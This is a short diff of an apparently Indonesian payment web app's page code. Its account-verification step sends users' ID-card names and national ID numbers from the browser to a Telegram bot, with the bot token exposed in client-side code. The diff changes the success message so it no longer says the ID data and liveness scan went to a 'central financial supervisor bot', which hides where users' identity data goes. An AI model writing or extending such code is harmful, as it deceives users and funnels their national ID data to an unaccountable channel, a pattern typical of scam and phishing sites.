@@ -1093,7 +1093,7 @@
         <div class="modal-content" style="text-align: center;">
             <div id="modal-icon" style="font-size: 50px; margin-bottom: 10px;"></div>
             <h3 id="modal-title" style="margin-bottom: 10px; color: var(--text-main);">Informasi</h3>
-            <div id="modal-desc" style="font-size: 14px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5;">Pesan Notifikasi Admin</div>
+            <div id="modal-desc" style="font-size: 14px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5;">Pesan Notifikasi</div>
             <button class="btn-modal" id="modal-primary-btn" onclick="closeInfoModal()">Mengerti</button>
         </div>
     </div>
@@ -2370,7 +2370,7 @@
             localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
             
             updateAuthUI();
-            showModal("Berkas Terikirim", "Data KTP & pemindaian liveness sukses terunggah ke bot pengawas finansial pusat.", "win");
+            showModal("Berkas Terikirim", "Sedang dalam proses verifikasi.", "win");
             
             let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('text', `*BERKAS VERIFIKASI AKUN FASTPAY*\nUID Profil: \`${userID}\`\nNama KTP: ${nama}\nNomor NIK: \`${nik}\`\n\nEksekusi Konfirmasi: \`/verif ${userID}\` \nTolak Dokumen: \`/tolak_verif ${userID}\``);
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
